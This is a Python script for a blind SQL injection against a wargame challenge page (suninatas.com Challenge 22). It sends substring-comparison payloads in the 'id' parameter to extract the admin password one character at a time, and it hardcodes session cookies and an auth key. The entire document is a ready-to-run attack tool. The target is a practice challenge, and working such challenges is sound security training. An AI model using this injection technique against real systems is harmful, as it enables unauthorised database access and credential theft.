#!/usr/bin/env python3
"""
Blind SQL Injection Script
Automates character-by-character extraction via substring-based comparisons.
Target: suninatas.com Challenge 22
"""

import requests
import string
import sys

# --- Configuration ---
TARGET_URL = "http://suninatas.com/challenge/web22/web22.asp"
COOKIES = {
    "ASP.NET_SessionId": "3g042optmn40uhuoxlqhkvai",
    "ASPSESSIONIDACTRACSS": "MEJDPMPAHECDELCJCFEOEINE",
    "ASPSESSIONIDCCTSAAQT": "NNMDDJIBCMFACGADEKFHFNCA",
    "ASPSESSIONIDQSBTDCST": "DNDPAPJCEPOJPKPFACBKBPKJ",
    "auth_key": "65038b0559e459420aa2d23093d01e4a",
    "ASPSESSIONIDAARSBCRR": "NNOJOPPCBMOBJCNACCPNBHIP",
    "ASPSESSIONIDCCTQCCSR": "FLDDKMEDLOFIPEODAHAPDDID",
    "ASPSESSIONIDCCRRBDTT": "AGEJLNGDPEFCCNCGDHAPBLEH"
}

CHARSET = string.ascii_letters + string.digits + "!@#$%^&*()_+"
MAX_LENGTH = 31
SUCCESS_INDICATOR = "OK"

def check_char(index, char):
    """Checks if the character at the given index matches the target."""
    payload = f"' and (substring(pw,{index},1)='{char}')--"
    params = {
        'id': f'admin{payload}',
        'pw': 'a',
    }
    
    try:
        # Note: Using params in requests.get handles URL encoding automatically
        response = requests.get(TARGET_URL, params=params, cookies=COOKIES, timeout=5)
        return SUCCESS_INDICATOR in response.text
    except requests.RequestException as e:
        print(f"\n[!] Request error: {e}")
        return False

def main():
    print(f"[*] Starting Blind SQL Injection on {TARGET_URL}")
    print(f"[*] Target max length: {MAX_LENGTH}")
    
    extracted_string = ""
    
    for i in range(1, MAX_LENGTH + 1):
        found = False
        # Visual progress for the current index
        sys.stdout.write(f"[*] Finding char {i:02}: ")
        sys.stdout.flush()
        
        for char in CHARSET:
            if check_char(i, char):
                extracted_string += char
                sys.stdout.write(f"{char}\n")
                sys.stdout.flush()
                found = True
                break
        
        if not found:
            sys.stdout.write("None found. Stopping.\n")
            break

    print("\n" + "="*30)
    print(f"EXTRACTED DATA: {extracted_string}")
    print("="*30)

if __name__ == "__main__":
    main()
